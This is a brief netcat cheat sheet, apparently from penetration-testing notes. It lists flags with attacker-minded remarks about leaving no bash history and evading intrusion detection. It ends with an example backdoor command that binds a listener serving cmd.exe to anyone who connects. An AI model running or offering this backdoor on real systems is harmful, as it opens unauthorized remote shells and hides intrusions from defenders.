# NETCAT 

### Commands:

#### -c, --sh-exec COMMAND = Executes the given command via /bin/sh (Doesn't write to bash history file of target)

#### -l = Listening mode

#### -p NUMBER = Port number to listen

#### -4, -6 = IPv4/IPv6 only (IDPS Evasion)

#### -m,max-conns NUMBER = Maximum NUMBER simultaneous connections (Tag to 1 to connect only you!)

#### -o --output = Dump session data to a file

#### -u = Uses UDP

#### -v = Verbosity level (Up to 3 times -vvv)

#### -n = No dns

#### -t = Telnet answer

#### -s = Source address to use

#### -k = Accept multiple connections in listen mode 

#### -e COMMAND = Execute the given command

### Example backdoor command:

    nc -lkp PORT -e "cmd.exe"
